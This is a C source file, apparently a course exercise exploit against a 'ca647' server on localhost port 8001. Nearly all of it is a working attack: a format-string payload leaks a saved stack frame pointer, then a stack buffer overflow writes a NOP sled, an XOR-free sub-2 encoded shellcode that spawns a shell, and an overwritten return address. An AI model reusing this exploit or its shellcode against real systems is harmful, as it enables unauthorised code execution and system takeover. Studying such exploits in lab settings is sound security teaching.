/*
  Exploiting the ca647 server
*/
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <errno.h>
#include <netdb.h>
#include <time.h>

#define	PORTNUM	(8001)
#define	BLENGTH	(256)

void *ebp;

/*
  Exploit the format string vulnerability to retrieve EBP value of handle_it stackframe
  Get the Buffer pointer saved in read_command pointing to the EBP of handle_it stackframe
*/
static void 
getEbp(char *buf) {
  strcpy(buf, "%u%u%u%u%u %p\n");
}

/*
  saving the handle_it ebp and goig to the vulnerable function execute_command
*/
static void
askTime(char *buf) {
  sscanf(buf, "%*s %p", &ebp);
  strcpy(buf, "1\n");
}

/*
  Exploit the stack based buffer overflow vulnerability

  We'll use 128 bits by first putting nops, then by putting our shellcode
  0    16                      128    132                          255
  +-----------------------------------------------------------------+
  | NOP|NOP NOP NOP NOP NOP NOP |                                   |
  +-----------------------------------------------------------------+
  | NOP|       SHELLCODE              EBP                           |
  +-----------------------------------------------------------------+
*/
static void
overflow(char *buf) {
  char shellcode[] = 
  // decoder with a sub 2
  "\xeb\x11\x5e\x31\xc9\xb1\x5b\x80\x6c\x0e\xff\x02\x80\xe9\x01\x75"
  "\xf6\xeb\x05\xe8\xea\xff\xff\xff"
  // encoded payload with an add 2
  "\xed\x2c\x60\x33\xc2\x8a\x48\x09\x8a\x48\x11\x8a\x48\x1b\x8b\x78"
  "\x1c\x8f\x60\x0a\x8b\x60\x20\x8f\x60\x12\x8b\x60\x24\x8b\x48\x28"
  "\xb2\x0d\x8b\xf5\x8f\x50\x1c\x8f\x58\x28\xcf\x82\xea\xd3\x01\x01"
  "\x01\x31\x64\x6b\x70\x31\x70\x65\x32\x2f\x6e\x72\x36\x34\x36\x34"
  "\x32\x2f\x67\x31\x64\x6b\x70\x31\x75\x6a\x32\x45\x43\x38\x36\x39"
  "\x61\x47\x4e\x4b\x56\x47\x61\x56\x47\x43\x4f";

  // Write a NOP slide
  memset(buf, '\x90', 128);

  // Write shellcode
  memcpy(buf + 16, shellcode, 24+91);

  // Get the address poiting to the nop slide
  ebp -= 128;

  // Rewriting the return pointer
  *(void **)(buf + 132) = ebp;

  // stop strcpy
  buf[136] = 0;
}

static void (*func[])(char *) = {
  &getEbp,
  &askTime,
  &overflow,
  NULL
};

static void
loop(int s)
{
  char buffer[BLENGTH];
  unsigned int i;

  for (i = 0; func[i]; ++i) {

    /* Receive prompt */
    recv(s, (void *)buffer, BLENGTH, 0);

    /* Display prompt */
    fputs(buffer, stdout);

    /* Call each function in func sequentially */
    func[i](buffer);

    /* Send user response */
    send(s, (void *)buffer, BLENGTH, 0);
  }
}

int
main(void)
{
  struct sockaddr_in server;
  struct hostent *host;
  int s;

  /* Create an Internet family, stream socket */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s < 0) {
    perror("socket()");
    exit(EXIT_FAILURE);
  }

  /* Server listening on localhost interface */
  if ((host = gethostbyname("localhost")) == NULL) {
    perror("gethostbyname()");
    exit(EXIT_FAILURE);
  }

  /* Fill in socket address */
  memset((char *)&server, '\0', sizeof (server));
  server.sin_family = AF_INET;
  server.sin_port = htons(PORTNUM);
  memcpy((char *)&server.sin_addr, host->h_addr_list[0], host->h_length);

  /* Connect to server */
  if (connect(s, (struct sockaddr *)&server, sizeof (server)) < 0) {
    perror("connect()");
    exit(EXIT_FAILURE);
  }

  /* Talk to server */
  loop(s);

  /* Close the socket */
  close(s);

  return (0);
}
